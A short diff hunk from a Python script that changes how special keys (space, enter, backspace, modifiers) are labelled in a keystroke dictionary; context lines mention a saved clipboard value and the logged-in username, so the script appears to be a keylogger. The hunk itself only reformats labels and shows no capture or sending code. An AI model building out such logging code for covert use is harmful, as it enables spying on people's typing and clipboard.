@@ -18,15 +18,15 @@ last_clipboard = ""
 
 # Dictionary for special keys
 special_keys = {
-    keyboard.Key.space: " SPACE ",
-    keyboard.Key.enter: " ENTER ",
-    keyboard.Key.backspace: " BACKSPACE ",
-    keyboard.Key.tab: " TAB ",
-    keyboard.Key.shift: " SHIFT ",
-    keyboard.Key.ctrl_l: " CTRL ",
-    keyboard.Key.alt_l: " ALT ",
-    keyboard.Key.cmd: " CMD ",
-    keyboard.Key.esc: " ESC ",
+    keyboard.Key.space: " ",
+    keyboard.Key.enter: " [ENTER] ",
+    keyboard.Key.backspace: " <- ",
+    keyboard.Key.tab: " [TAB] ",
+    keyboard.Key.shift: " ^ ",
+    keyboard.Key.ctrl_l: " [CTRL] ",
+    keyboard.Key.alt_l: " [ALT] ",
+    keyboard.Key.cmd: " [CMD] ",
+    keyboard.Key.esc: " [ESC] ",
 }
 
 username = os.getlogin()
